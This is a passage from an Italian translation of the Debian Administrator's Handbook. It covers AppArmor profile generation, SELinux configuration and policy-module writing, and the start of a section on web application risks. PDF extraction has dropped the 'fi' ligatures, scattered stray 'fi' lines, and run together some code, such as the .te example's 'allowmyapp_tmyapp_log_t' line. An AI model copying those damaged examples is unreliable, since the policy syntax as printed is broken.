aa-genprof è di fatto uno smart wrapper di aa-logprof [uno strumento che aggiorna la modalità
di applicazione della politica di sicurezza associata ad un pro lo]: aa-genprof realizza un pro lo
vuoto, lo carica in modalità compliant ed esegue poi aa-logprof per aggiornare la modalità di
applicazione della politica di sicurezza del pro lo precedentemente registrata. Potrete in ogni caso
eseguire successivamente aa-logprof per migliorare un pro lo creato.

Per generare un pro lo completo è consigliabile eseguire il programma bersaglio in tutti i modi
possibili. Nel caso di dhclient, ciò comporta la sua esecuzione tramite Network Manager, ifupdown,
manualmente, ecc. Alla ne, otterrete un le /etc/apparmor.d/usr.sbin.dhclient simile al
seguente:

# Last Modified: Fri Jul 5 00:51:02 2019
#include <tunables/global>

/usr/sbin/dhclient {
  #include <abstractions/base>
  #include <abstractions/nameservice>

 capability net_bind_service,
capability net_raw,

/bin/dash r,
/etc/dhcp/* r,
/etc/dhcp/dhclient-enter-hooks.d/* r,
/etc/dhcp/dhclient-exit-hooks.d/* r,
/etc/resolv.conf.* w,
/etc/samba/dhcp.conf.* w,
/proc/*/net/dev r,
/proc/filesystems r,
/run/dhclient*.pid w,
/sbin/dhclient mr,
/sbin/dhclient-script rCx,
/usr/lib/NetworkManager/nm-dhcp-helper Px,
/var/lib/NetworkManager/* r,
/var/lib/NetworkManager/*.lease rw,
/var/lib/dhcp/*.leases rw,

owner /etc/** mrwk,
owner /var/** mrwk,
owner /{,var/}run/** mrwk,
 }

                                                           TDAH_2.0   Capitolo XIV - Sicurezza Pagina 423
        fi
             fi
                              fi
                                   fi
                                   fi
                                                 fi
                                                      fi
                                                                                      fi
                                                                                           fi
          Ed un le /etc/apparmor.d/usr.sbin.dhclient-script simile al seguente:

          # Last Modified: Fri Jul 5 00:51:55 2019
           #include <tunables/global>

          /usr/sbin/dhclient-script {
            #include <abstractions/base>
            #include <abstractions/bash>
            #include <abstractions/lightdm>
          }

          14.5. Introduzione a SELinux

          14.5.1. I principi

          SELinux (Security Enhanced Linux) è un Mandatory Access Control (MAC) [trad. lett. sistema
          controllo accessi] che si basa sull’interfaccia Linux LMS (Linux Security Modules). In pratica il
          kernel richiede ad SELinux prima di rispondere a qualsiasi chiamata di sistema [il meccanismo
          attraverso cui un’applicazione richiede un servizio al kernel] se il processo coinvolto è autorizzato
          ad ottenere l’implementazione dell'operazione in questione.

          SELinux, per poter autorizzare o negare un’operazione, impiega un insieme di regole denominate
          collettivamente policy. Le regole in sé sono complesse da realizzare. Fortunatamente due set di
          regole standard (targeted e strict) sono offerte da SELinux per far risparmiare gran parte della
          con gurazione.

          Il sistema dei permessi di SELinux è totalmente diverso da quello supportato da un sistema Unix
          tradizionale. Le autorizzazioni di un processo dipendono dal suo security context (contesto di
          sicurezza). Il contesto è de nito attraverso l’identity (identità) dell’utente che ha avviato il
          processo, dal role (ruolo) e dal domain (dominio) dell’utente quando è stato avviato il processo. Le
          autorizzazioni stesse dipendono dal dominio, ma le transizioni fra un dominio e l'altro
          sono gestite dai ruoli. In ne, le transizioni tra i ruoli dipendono dall'identità.

                                        Figura 14.1 Contesti di sicurezza e utenti Unix

          Pagina 424 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
     fi
                      fi
                           fi
In pratica, durante il login, all'utente viene assegnato un contesto di sicurezza (in base al ruolo che
ha il diritto di assumere). Il contesto di sicurezza individua il dominio corrente, nonché il dominio
per tutti i nuovi child processes. Qualora desideriate personalizzare un ruolo e di conseguenza il
dominio associato, dovrete invocare newrole -r role_r -t domain_t (di solito è consentito un solo
dominio per un dato ruolo, rendendo il parametro -t inutile). Il sopracitato comando richiede la
password utente. La ragione di tale prassi è che in questo modo viene impedito a qualsiasi
programma di modi care il ruolo autonomamente. Inoltre le modi che possono essere implementate
solo se previsto dalla policy di SELinux.

Naturalmente i diritti non vengono applicati universalmente a tutti gli objects [oggetti] ( les,
directories, sockets, devices, ecc.). Possono variare da un oggetto all'altro. Per raggiungere tale
scopo, ogni oggetto viene associato ad un type [tipo] (questo meccanismo viene de nito labeling).
I diritti correlati ai domini sono pertanto individuati in termini di operazioni autorizzate (o non
autorizzate) in base ai tipi (ed implicitamente in base a tutti gli oggetti che sono stati contrassegnati
con lo stesso tipo attraverso il labeling).

           EXTRA           Internamente, un dominio è soltanto un tipo, che si applica unicamente ai processi.
 Dominio e tipo            Per tale ragione i domini hanno il suf sso _t come i tipi assegnati agli oggetti.
 sono equivalenti

Per impostazione prede nita, un programma in esecuzione eredita il dominio dell'utente che lo ha
avviato, ma le policies di SELinux esigono che i programmi più importanti siano eseguiti in domini
dedicati. Pertanto gli eseguibili vengono contrassegnati con un tipo dedicato (ad esempio ssh è
contrassegnato con ssh_exec_t, di conseguenza al suo avvio gli viene assegnato automaticamente il
dominio ssh_t). Questo meccanismo automatico di transizione del dominio consente di garantire
esclusivamente i diritti necessari al corretto funzionamento di ciascun programma; SELinux si basa
su tale principio.

                                Figura 14.2 Transizioni di dominio automatiche

                                                         TDAH_2.0      Capitolo XIV - Sicurezza Pagina 425
        fi
             fi
                      fi
                                                            fi
                                                                              fi
                                                                                       fi
                      IN PRATICA              Per conoscere il contesto di sicurezza di un dato processo, dovrete utilizzare
                 Conoscere il                 l’opzione Z di ps.
                 security context
                                              $ ps axZ | grep vstfpd
                                              system_u:system_r:ftpd_t:s0                2094 ?             Ss 0:00     /usr/sbin/
                                              -> vsftpd

                                              Il primo campo include (separati da due punti): l'identità, il ruolo, il dominio ed il
                                              livello MCS. Il livello MCS (Multi-Category Security) è un parametro con ef cacia
                                              sulla con gurazione della politica di sicurezza inerente alla riservatezza, in quanto
                                              regola l’accesso ai les in base alla loro “sensitivity” [si riferisce alla “sensibilità”
                                              delle informazioni e dei dati]. Questa funzionalità non verrà discussa in questo
                                              libro.
                                              Per conoscere il contesto di sicurezza attualmente attivo dovrete invocare id -Z
                                              attraverso la shell.

                                              $ id -Z
                                              unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

                                              In ne, per conoscere il type (tipo) assegnato a un le, potrete utilizzare ls -Z.

                                              $ ls -Z test /usr/bin/ssh
                                              unconfined_u:object_r:user_home_t:s0 test
                                                   system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh

                                              Occorre precisare che l'identità ed il ruolo associati ad un le non hanno particolare
                                              importanza (e non vengono mai utilizzati); difatti viene assegnato a tutti gli oggetti
                                              un contesto di sicurezza completo solo per ragioni di uniformità.

               14.5.2. Come con gurare SELinux

               Il supporto di SELinux è nativo nei kernels prede niti distribuiti da Debian. Gli strumenti
               fondamentali di Unix supportano SELinux senza necessità di personalizzazioni.

               Attraverso il comando apt install selinux-basics selinux-policy-default potrete installare
               automaticamente i pacchetti necessari per con gurare un sistema SELinux.

               Il pacchetto selinux-policy-default contiene un set di regole standard. Per impostazione
               prede nita, la policy limita l'accesso di alcuni servizi altamente esposti. Le sessioni utente
               non sono limitate, di conseguenza è improbabile che SELinux possa bloccare gli utenti legittimi.

               Tuttavia ciò intensi ca la sicurezza dei servizi di sistema in esecuzione sulla macchina.
               Per ottenere una con gurazione equivalente alle vecchie regole "strict" (rigide), dovrete
               disattivare il modulo unconfined (la gestione dei moduli viene descritta in questo capitolo).

               Dopo aver installato la policy dovrete effettuare il labeling di tutti i les disponibili (ossia dovrete
               assegnare ai les in questione un tipo). Tale operazione dovrà essere avviata manualmente
               attraverso fixfiles relabel.

               Il sistema SELinux ora è pronto. Per attivarlo dovrete aggiungere il parametro selinux=1
               security=selinux al kernel Linux. Il parametro audit=1 abilita il tracciamento di SELinux
               attraverso logs delle operazioni ri utate. In ne il parametro enforcing=1 abilita le regole; infatti
               SELinux, senza il sopracitato parametro, gestisce le sue attività nella modalità prede nita
               denominata permissive (permissiva) che per quanto tenga traccia delle azioni vietate ne consente
               comunque la loro esecuzione. Di conseguenza dovrete modi care il le di con gurazione di GRUB per

               Pagina 426 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
     fi
          fi
                fi
                     fi
                          fi
                               fi
                                    fi
                                         fi
                                                      fi
                                                           fi
                                                                fi
                                                                     fi
                                                                          fi
                                                                               fi
                                                                                    fi
                                                                                    fi
                                                                                         fi
                                                                                                  fi
                                                                                                       fi
aggiungere i parametri desiderati. Il modo più semplice per farlo è attraverso la variabile
GRUB_CMDLINE_LINUX in /etc/default/grub ed eseguire poi update-grub. Al successivo avvio,
SELinux sarà attivo.
Dovrete tenere presente che lo script selinux-activate automatizza le suddette operazioni e
consente di forzare il labeling al riavvio successivo, in modo che non vengano creati les privi di
labeling quando ancora SELinux non è attivo o il labeling è in corso.

14.5.3. Come gestire un sistema SELinux

La policy di SELinux è un set di regole modulare; durante l’installazione della policy vengono rilevati
e attivati automaticamente tutti i moduli necessari in base ai servizi già installati. Di conseguenza, il
sistema è immediatamente funzionale. Tuttavia, se installerete un servizio successivamente
l’installazione della policy di SELinux, dovrete attivare manualmente il corrispondente modulo. A
tale scopo è dedicato il comando semodule. Inoltre, dovrete de nire i ruoli per i quali ciascun utente
sarà autorizzato attraverso il comando semanage.

Attraverso i due sopracitati comandi potrete modi care la con gurazione corrente di SELinux che è
conservata in /etc/selinux/default/. Contrariamente alla prassi per cui è possibile
personalizzare i les di con gurazione di /etc/, i les in /etc/selinux/default/ non devono
essere modi cati manualmente. Dovrete gestirli utilizzando i programmi previsti a tale scopo.

            ANDANDO         Dato che l’NSA non offre alcuna documentazione uf ciale di supporto per
               OLTRE        SELinux, la community ha creato una pagina wiki per colmare questa
      Maggiore              palese mancanza. Inoltre per quanto la pagina wiki possa contenere
      documentazione        numerose informazioni dovrete considerare che la maggioranza dei
                            contributori SELinux sono utenti Fedora (distribuzione in cui SELinux è
                            abilitato per impostazione prede nita). La documentazione difatti tende ad
                            essere speci ca per Fedora.

                              https://selinuxproject.org

                            È consigliabile pertanto consultare anche la pagina wiki di Debian dedicata
                            a SELinux ed il blog di Russell Coker, uno degli sviluppatori Debian più
                            attivi per il supporto su SELinux.

                              https://wiki.debian.org/SELinux
                              https://etbe.coker.com.au/tag/selinux/

14.5.3.1 Gestione dei moduli SELinux

I moduli SELinux disponibili vengono memorizzati nella directory /usr/share/selinux/
default/. Per attivare uno dei moduli in questione nella vostra con gurazione corrente, dovrete
utilizzare semodule -i module.pp.bz2. L'estensione pp.bz2 è l’acronimo di policy package
[traducibile elasticamente in "pacchetto regole"] (compresso con bzip2).

Diversamente se desiderate rimuovere un modulo dalla vostra con gurazione corrente dovrete
utilizzare il comando semodule -r module. In ne il comando semodule -l elenca i moduli
correntemente installati. Inoltre l’output del precedente comando include anche il numero di
versione del modulo. I moduli possono anche essere abilitati e disabilitati selettivamente attraverso i
comandi semodule -e (per abilitare) e semodule -d (per disabilitare).

# semodule -i /usr/share/selinux/default/abrt.pp.bz2

                                                            TDAH_2.0    Capitolo XIV - Sicurezza Pagina 427
fi
 fi
        fi
                 fi
                       fi
                                      fi
                                           fi
                                            fi
                                                 fi
                                                      fi
                                                       fi
                                                              fi
                                                                   fi
                                                                               fi
     libsemanage.semanage_direct_install_info: abrt module will be disabled after install
     -> as there is a disabled instance of this module present in the system.
     # semodule -l
     accountsd
     acct
     [...]
     # semodule -e abrt
     # semodule -d accountsd
     # semodule -l
     abrt
     acct
     [...]
     # semodule -r abrt
     libsemanage.semanage_direct_remove_key: abrt module at priority 100 is now active.
      -> semodule -l

     semodule carica immediatamente la nuova con gurazione a meno che non utilizziate l’opzione -n.
     Si precisa che il programma ha ef cacia sulla con gurazione corrente (de nita dalla variabile
     SELINUXTYPE in /etc/selinux/config), ma potrete individuare un’altra con gurazione da
     modi care attraverso l’opzione -s.

     14.5.3.2 Gestione delle identità

     Ogni volta che un utente effettua il login riceve un’identità SELinux. Tale identità de nisce i ruoli per
     i quali ciascun utente sarà autorizzato. Ciò comporta la presenza di due mapping [mappature]
     (dall’utente all’identità e dall’identità ai ruoli) con gurabili attraverso il comando semanage.

     La lettura della manual page semanage(8) è consigliabile. Tutti i concetti da gestire hanno una man
     page dedicata; ad esempio semanage-login(8). Anche se la sintassi dei comandi per tutti i concetti
     da gestire è simile vi consigliamo comunque la lettura delle man page. Difatti molte opzioni sono
     comuni per tutti i sottocomandi: -a iniziale del termine inglese add (aggiungere); -d iniziale del
     termine inglese delete (cancellare); -m iniziale del termine inglese modify (modi care); -l iniziale
     del termine inglese list (elencare); -t iniziale del termine inglese type (tipo o dominio).

     Il comando semanage login -l elenca il mapping corrente fra gli identi catori utente e le identità
     SELinux. Agli utenti che non hanno una voce esplicita viene assegnata l’identità indicata in
     the_defualt_entry. Il comando semanage login -a -s user_u user associa l’identità user_u ad
     un determinato user. In ne il comando semanage login -d user fa decadere l’entry con il mapping
     assegnato all’utente.

     # semanage login -a -s user_u rhertzog
     # semanage login -l

     Login Name                 SELinux User             MLS/MCS                            Range Service

     _default_                  unconfined_u             s0-s0:c0.c1023                             *
     rhertzog                   user_u                   s0                                         *
     root                       unconfined_u             s0-s0:c0.c1023                             *

     # semanage login -d rhertzog

     Pagina 428 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
                  fi
                           fi
                                          fi
                                               fi
                                                    fi
                                                                   fi
                                                                        fi
                                                                             fi
                                                                                  fi
                                                                                       fi
semanage user -l elenca il mapping tra identità SELinux e ruoli autorizzati. Per aggiungere
una nuova identità dovrete de nire sia i ruoli corrispondenti, sia il pre sso del labeling da utilizzare
per assegnare il tipo ai les personali (/home/user/*). Il pre sso da de nire deve essere scelto fra:
user, staff e sysadm. Troverete il pre sso “staff” nei les del tipo “staff_home_dir_t”. Il
comando per creare un'identità è semanage user -a -R roles -P prefix identity. In ne, potrete
rimuovere un'identità utente SELinux attraverso il comando semanage user -d identity.

# semanage user -a -R ’staff_r user_r’ -P staff test_u
# semanage user -l
               Labeling     MLS/        MLS/
SELinux User   Prefix       MLS Level   MCS Range                                        SELinux Roles

root           sysadm                  s0             s0-s0:c0.c1023                 staff_r sysadm_r system_r
staff_u        staff                   s0             s0-s0:c0.c1023                 staff_r sysadm_r
sysadm_u       sysadm                  s0             s0-s0:c0.c1023                 sysadm_r
system_u       user                    s0             s0-s0:c0.c1023                 system_r
test_u         staff                   s0             s0                             staff_r user_r
unconfined_u   unconfined              s0             s0-s0:c0.c1023                 system_r unconfined_r
user_u         user                    s0             s0                             user_r
# semanage user -d test_u

14.5.3.3 Gestione di File Contexts, Ports e Booleans

Ciascun modulo SELinux offre una serie di regole per il labeling dei les, ma potrete aggiungere ad
hoc delle regole di labeling per supportare casi particolari. Per esempio se desiderate autorizzare il
web server alla lettura della gerarchia les /srv/www/ potrete eseguire semanage fcontext -a -t
httpd_sys_content_t ”/srv/www(/.*)?” e poi restorecon -R /srv/www/. Il primo comando
salva le nuove regole di labeling mentre il secondo comando resetta il labeling correntemente in uso.
Anche i ports TCP/UDP sono contrassegnati con un labeling in modo da garantire la ricezione
soltanto ai demoni legittimi. Ad esempio, se desiderate che il web server sia in grado di mettersi in
ricezione del port 8080 dovrete eseguire semanage port -m -t http_port_t -p tcp 8080.
Diversi moduli SELinux esportano le opzioni booleane che potrete personalizzare per modi care il
funzionamento delle regole prede nite. L'utilità getsebool consente di veri care lo stato delle
suddette opzioni (getsebool boolean permette di visualizzare lo stato di una data opzione, mentre
getsebool -a le visualizza tutte). Il comando setsebool boolean value cambia il valore corrente
di un'opzione booleana. L'opzione -P rende la modi ca permanente, ovvero il nuovo valore diverrà il
valore prede nito, ma sarà ef cace al successivo riavvio.
Nell’esempio seguente viene descritto come autorizzare l’accesso del web server alle home
directories (utile quando gli utenti hanno siti web personali in ~/public_html/).

# getsebool httpd_enable_homedirs
httpd_enable_homedirs --> off

                                                              TDAH_2.0          Capitolo XIV - Sicurezza Pagina 429
fi
           fi
                  fi
                       fi
                            fi
                                 fi
                                  fi
                                            fi
                                                 fi
                                                         fi
                                                                 fi
                                                                      fi
                                                                           fi
                                                                                fi
                                                                                            fi
                                                                                                 fi
     # setsebool -P httpd_enable_homedirs on
     # getsebool httpd_enable_homedirs
     httpd_enable_homedirs --> on

     14.5.4 Adeguamento delle Regole

     La policy SELinux è modulare, pertanto essere in grado di sviluppare nuovi moduli (possibilmente
     personalizzati) per le applicazioni che ne sono prive potrebbe essere utile. Inoltre i nuovi moduli
     potranno integrare la reference policy.

     Per creare i nuovi moduli avrete bisogno anche dei pacchetti selinux-policy-dev e selinux-
     policy-doc. Quest’ultimo include la documentazione delle regole standard (/usr/share/doc/
     selinux-policy.doc/html) ed i les d’esempio che possono essere usati come modelli per creare i
     nuovi moduli. Di conseguenza è consigliabile installarli per poterli meglio consultare:

     $    cp   /usr/share/doc/selinux-policy-doc/Makefile.example Makefile
     $    cp   /usr/share/doc/selinux-policy-doc/example.fc ./
     $    cp   /usr/share/doc/selinux-policy-doc/example.if ./
     $    cp   /usr/share/doc/selinux-policy-doc/example.te ./

     Il le .te è il più importante fra tutti in quanto de nisce le regole. Il le .fc de nisce i file
     contexts ossia i tipi assegnati ai les in relazione al modulo in questione. I dati inclusi nel le .fc
     sono utilizzati durante il labeling dei les. In ne il le .if de nisce l’interfaccia del modulo: è un set
     di “public functions” [funzioni condivise] che altri moduli possono usare per interagire
     correttamente con il modulo che state creando.

     14.5.4.1 Come scrivere un le .fc

     La lettura dell’esempio seguente dovrebbe essere suf ciente per comprendere la struttura di un le.
     Potrete usare un’espressione regolare per assegnare lo stesso contesto di sicurezza a diversi les
     oppure ad un intero directory tree.

                                                   Esempio 14.2 Il le example.fc

     #    myapp executable will have:
     #    label: system_u:object_r:myapp_exec_t
     #    MLS sensitivity: s0
     #    MCS categories: <none>

     /usr/sbin/myapp --                   gen_context(system_u:object_r:myapp_exec_t,s0)

     14.5.4.2 Come scrivere un le .if

     Nell'esempio seguente, il primo interface (myapp_domtrans) veri ca chi ha il diritto di eseguire
     l'applicazione. Il secondo interface (myapp_read_log) garantisce i permessi di lettura sui log les
     dell'applicazione.

     Pagina 430 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
         fi
                      fi
                      fi
                           fi
                                fi
                                     fi
                                              fi
                                                   fi
                                                        fi
                                                             fi
                                                                  fi
                                                                       fi
                                                                            fi
                                                                                   fi
                                                                                        fi
                                                                                             fi
                                                                                                  fi
                                                                                                       fi
     Ciascuna interfaccia deve generare un valido set di regole da integrare in un le .te. Dovrete
     pertanto dichiarare tutti i tipi da utilizzare (con la macro gen_require) ed impiegare le direttive
     prede nite per garantire i permessi. Occorre precisare che potrete utilizzare le interfacce attraverso
     altri moduli. Il prossimo paragrafo vi fornirà maggiori spiegazioni su come de nire i suddetti diritti.

                                          Esempio 14.3 Il le example.if

     ## <summary>Myapp example policy</summary>
     ## <desc>
     ##             
     ##                               More descriptive text about myapp. The <desc>
     ##                               tag can also use 
, <ul>, and <ol>
     ##                               html tags for formatting.
     ##             
     ##             
     ##                               This policy supports the following myapp features:
     ##                               <ul>
     ##                               <li>Feature A</li>
     ##                               <li>Feature B</li>
     ##                               <li>Feature C</li>
     ##             </ul>
     ##             
     ## </desc>
     #

     ########################################
     ## <summary>
     ##             Execute a domain transition to run myapp.
     ## </summary>
     ## <param name=”domain”>
     ##             Domain allowed to transition.

     ## </param>
     #
     interface(‘myapp_domtrans’,‘
             gen_require(‘
                      type myapp_t, myapp_exec_t;
             ’)
             domtrans_pattern($1,myapp_exec_t,myapp_t)
     ’)
     ########################################
     ## <summary>
     ##       Read myapp log les.
     ## </summary>
     ## <param name=”domain”>
     ##       Domain allowed to read the log les.
     ## </param>

                                                         TDAH_2.0         Capitolo XIV - Sicurezza Pagina 431
fi
       fi
               fi
                             fi
                                                                          fi
                                                                               fi
     #
     interface(‘myapp_read_log’,‘
             gen_require(‘
                      type myapp_log_t;
             ’)
             logging_search_logs($1)
             allow $1 myapp_log_t: le r_ le_perms;
     ’)

       DOCUMENTAZIONE               La reference policy si è sviluppata sotto forma di progetto libero basato sui
      Spiegazioni sulla             contributi volontari. Il progetto è ospitato da Tresys, una delle società più attive
      reference policy              riguardo a SELinux. La loro pagina wiki contiene spiegazioni sulla struttura
                                    delle regole e sulla loro creazione.

                                    ✦https://github.com/SELinuxProject/refpolicy/wiki/GettingStarted

     14.5.4.3 Come scrivere un le .te

     Date un’occhiata al le example.te

         ANDANDO OLTRE              Per strutturare correttamente la policy, gli sviluppatori di SELinux impiegano
      Il linguaggio m4 macro        un macro-comand processor. In pratica gli sviluppatori invece di ripetere
                                    un’in nità di direttive allow molto simili, creano delle “funzioni macro” con una
                                    logica di alto-livello, che tra l’altro agevola la lettura della policy.
                                    La funzione macro impiegata per la compilazione delle regole è m4. A sua volta la
                                    funzione macro deve compiere l’operazione opposta rispetto a quella degli
                                    sviluppatori: ossia, partendo dalle direttive di alto livello ed espandendole, deve
                                    costruire un vasto database di direttive allow.
                                    Di conseguenza le "interfacce" SELinux non sono altro che funzioni macro che
                                    verranno sostituite da un set di regole in fase di compilazione. Anche diversi
                                    diritti sono in realtà un insieme di autorizzazioni che verranno sostituite dai
                                    loro valori in fase di compilazione.

     policy_module(myapp,1.0.0) 1
     ########################################
     #
     # Declarations
     #
     typemyapp_t; 2
     type myapp_exec_t;
     domain_type(myapp_t)
     domain_entry_file(myapp_t,myapp_exec_t) 3

     type myapp_log_t;
     logging_log_file(myapp_log_t) 4

     Pagina 432 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
             fi
                     fi
                          fi
                               fi
     type myapp_tmp_t;
     files_tmp_file(myapp_tmp_t)

     ########################################
     #
     # Myapp local policy
     #

     allowmyapp_tmyapp_log_t:file{read_file_permsappend_file_perms}; 5

     allow myapp_t myapp_tmp_t:file manage_file_perms;
     files_tmp_filetrans(myapp_t,myapp_tmp_t,file)

     1 Il modulo deve essere identi cato attraverso il suo nome e numero di versione. Questa direttiva è
     obbligatoria.
     2 In ottemperanza alle presenti direttive i moduli dovranno dichiarare l’introduzione di nuovi tipi.
     Non esitate a creare tutti i tipi necessari, piuttosto che distribuire diritti inutili.
     3 Queste interfacce speci cano che il tipo myapp_t (come qualsiasi process domain) dovrebbe
     essere utilizzato per qualsiasi eseguibile con labeling myapp_exec_t. Ciò implica che venga aggiunto
     un attributo exec_type a questi oggetti e la presenza in sé dell’attributo exec_type consente inoltre
     ad altri moduli di garantire i permessi di esecuzione ai suddetti programmi: ad esempio il modulo
     userdomain autorizza i processi con domini user_t, staff_t e sysadm_t di eseguire tali
     programmi. I domini di altre applicazioni con nate non avranno il diritto di darne esecuzione, a
     meno che non lo prevedano delle regole con diritti simili (come nel caso di dpkg attraverso il suo
     dominio dpkg_t).
     4 logging_log_file è un'interfaccia offerta dalla reference policy. Tale interfaccia individua i log
       les attraverso il labeling dei les con un dato tipo, in modo che i log les possano bene ciare dei loro
     legittimi e correlati diritti (ad esempio i diritti che consentono a logrotate di gestirli).
     5 La direttiva allow è la direttiva di base che autorizza un'operazione. Il primo parametro è il
     process domain a cui viene consentito di eseguire l'operazione. Il secondo parametro descrive
     l'oggetto che un processo del suddetto dominio potrà gestire. Quest’ultimo parametro richiede un
     form "type:class" in cui type rappresenta il tipo SELinux, mentre class rappresenta la natura
     dell'oggetto ( le, directory, socket, fo, ecc.). In ne, l'ultimo parametro descrive i permessi (le
     operazioni autorizzate).

     I permessi vengono de niti sotto forma di un insieme di operazioni autorizzate attraverso il
     seguente template: { operation1 operation2 }. Potrete anche utilizzare delle macro per
     rappresentare la maggior parte delle autorizzazioni più utili. /usr/share/selinux/devel/
     include/support/obj_perm_sets.spt li elenca.

     La seguente pagina web offre un elenco relativamente completo di object classes e dei permessi che
     possono essere concessi:

           https://www.selinuxproject.org/page/ObjectClassesPerms

                                                          TDAH_2.0    Capitolo XIV - Sicurezza Pagina 433
fi
      fi
                  fi
                       fi
                            fi
                             fi
                                  fi
                                        fi
                                             fi
                                                               fi
                                                                                 fi
          Giunti a questo punto non resta che trovare il set minimo di regole necessarie al corretto
          funzionamento dell’applicazione target o del servizio. Per raggiungere tale risultato dovrete
          conoscere le funzionalità dell'applicazione e della sua gestione (o creazione) dei dati.

          Tuttavia potrete attuare un approccio empirico. Dopo che gli oggetti rilevanti avranno un labeling
          corretto, potrete utilizzare l'applicazione in modalità permissiva: in questo modo le operazioni
          normalmente non autorizzate verranno registrate, ma saranno eseguite lo stesso. Quindi sarà
          suf ciente analizzare i logs per individuare le operazioni che devono essere autorizzate. A seguire
          un esempio di una log entry:

          avc: denied { read write } for pid=1876 comm=”syslogd” name=”xconsole” dev=tmpfs
              ->ino=5510 scontext=system_u:system_r:syslogd_t:s0
              ->tcontext=system_u:object_r: ̄ ->device_t:s0 tclass=fifo_file permissive=1

          Per comprendere meglio questo messaggio, analizziamolo poco a poco.

          Messaggio                                              Descrizione

          avc:denied                                             Un'operazione è stata negata.

          { read write }                                         Questa operazione richiedeva permessi di
                                                                 lettura e di scrittura

          pid=1876                                               Il processo con PID 1876 ha eseguito
                                                                 l'operazione (o ha tentato di eseguirla)

          comm="syslogd"                                         Il processo era un'istanza del programma
                                                                 syslogd

          name="xconsole"                                        Il target object è stato denominato xconsole.
                                                                 In alcuni casi potrete anche avere una variabile
                                                                 "path" con un full path.

          dev=tmpfs                                              Il device che ospita il target object è un tmpfs
                                                                 (un lesystem - un sistema di archiviazione).
                                                                 Con un disco reale, potreste trovare invece la
                                                                 partizione contenente l'oggetto (per esempio:
                                                                 "sda3")

          ino=5510                                               L'oggetto è identi cato dal numero di inode
                                                                 5510.

          scontext=system_u:system_r:                            Questo è l’attuale security context del processo
          syslogd_t:s0                                           che ha eseguito l’operazione

          tcontext=system_u:object_r:device_t:s0                 Questo è il contesto di sicurezza del target
                                                                 object

          tclass=fifo_file                                       Il target object è un FIFO le

                                         Tabella 14.1 Analisi di una traccia SELinux

          Analizzando il precedente log entry potrete creare una regola che autorizzi tale operazione. Per
          esempio allow syslogd_t device_t:fifo_file { read write }. Questo processo può essere reso
          automatico attraverso il comando audit2allow offerto dal pacchetto policycoreutils. Questo
          tipo di approccio è utile solo se i diversi oggetti sono già stati opportunamente etichettati

          Pagina 434 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
     fi
               fi
                       fi
     (labeling) in base a cosa occorre con nare. In ogni caso dovrete revisionare attentamente le regole
     generate e convalidarle basandovi sulla vostra conoscenza dell'applicazione. Difatti, spesso questo
     tipo di approccio comporta la concessione di più autorizzazioni rispetto a quelle realmente
     necessarie. Una soluzione consona è creare nuovi tipi per assegnare solamente a loro le
     autorizzazioni necessarie. Diversamente se un’operazione negata non è un errore fatale per
     l'applicazione, dovrete aggiungere una regola dontaudit in modo che non venga generato un log
     entry nonostante l'effettivo ri uto.

                                     È sorprendente che i ruoli non intervengano nella creazione delle regole. Difatti
           INFORMAZIONE              SELinux impiega solamente i domini per conoscere quali operazioni sono
               ACCESSORIA
                                     autorizzate. Invece il ruolo interviene indirettamente per consentire all'utente di
          Niente ruoli nelle
                                     passare ad un altro dominio.
          regole della               SELinux si basa su una teoria denominata Type Enforcement secondo la quale il
          policy                     tipo è l'unico elemento che conta nell'assegnazione dei diritti.

     14.5.4.4 Compilazione dei les

     Quando i tre les (example.if, example.fc ed example.te) saranno in grado di soddisfare le
     vostre esigenze di nuove regole dovrete solamente rinominarli come myapp.extension ed eseguire
     make NAME=devel per generare un modulo nel le myapp.pp (che potrete immediatamente caricare
     attraverso semodule -i myapp.pp). Se sono stati de niti diversi moduli, make creerà tutti i les .pp
     corrispondenti.

     14.6. Altre considerazioni sulla sicurezza

     La sicurezza non riguarda soltanto l’aspetto tecnico; difatti, più di ogni altra cosa, occorre acquisire
     delle buoni abitudini ed essere consapevoli dei rischi. Questo paragrafo tratta una rassegna dei rischi
     più frequenti, nonché una serie di buone pratiche che, a seconda dei casi, miglioreranno la sicurezza
     o ridurranno l'effetto di un attacco riuscito.

     14.6.1. I rischi dovuti alle applicazioni web

     Il carattere universale delle applicazioni web ha comportato la loro proliferazione. Spesso sono
     eseguite in parallelo: una webmail, una pagina wiki, un groupware system, forums, una galleria
     fotogra ca, un blog, ecc.. Molte di queste applicazioni sono basate su piattaforme LAMP (acronimo
     costituito dalle iniziali delle componenti software con cui vengono realizzate - Linux, Apache, MySQL,
     PHP). E purtroppo sono scritte senza prestare troppa attenzione ai problemi di sicurezza. I dati
     provenienti dall’esterno vengono utilizzati senza alcuna o minima validazione. Alcuni valori possono
     essere utilizzati per sovvertire la chiamata di un comando in modo che venga eseguito un altro
     comando. Nel corso degli anni, i problemi più evidenti sono stati corretti, ma vengono regolarmente
     scoperte nuove vulnerabilità di sicurezza.

               DIZIONARIO            Se un programma include dati nelle queries SQL in modo non sicuro, può
          SQL Injection              comportare vulnerabilità dovute a SQL Injection (iniezioni SQL); tale de nizione
                                     include gli atti idonei a modi care un parametro in modo che il programma esegua
                                     una query differente rispetto a quella prevista, per danneggiare i dati o per
                                     accedere ai dati che dovrebbero essere non accessibili.

                                       https://en.wikipedia.org/wiki/SQL_Injection

                                                                    TDAH_2.0      Capitolo XIV - Sicurezza Pagina 435
fi
     fi
                      fi
                           fi
                                fi
                                       fi
                                                 fi
                                                       fi
                                                                     fi
                                                                                                    fi
     È quindi fondamentale aggiornare regolarmente le applicazioni web per eliminare note vulnerabilità
     oggetto di exploit da cracker (professionisti o dilettanti - quest’ultimi denominati in modo
     dispregiativo script kiddy).
     A seconda dei casi, il rischio varia: si va dalla distruzione dei dati all'esecuzione di comandi
     arbitraria, compresi atti vandalici sui siti web.

     14.6.2. Sapere cosa aspettarsi

     La vulnerabilità di un’applicazione Web è spesso un punto di partenza per un atto di pirateria
     informatica. In breve a seguire sono descritte le possibili conseguenze.

                                    Apache 2 include i moduli che consentono di ltrare le queries HTTP. Ciò permette
                 BREVE
              ACCENNO               di bloccare alcuni vettori di attacco. Per esempio per prevenire gli attacchi buffer
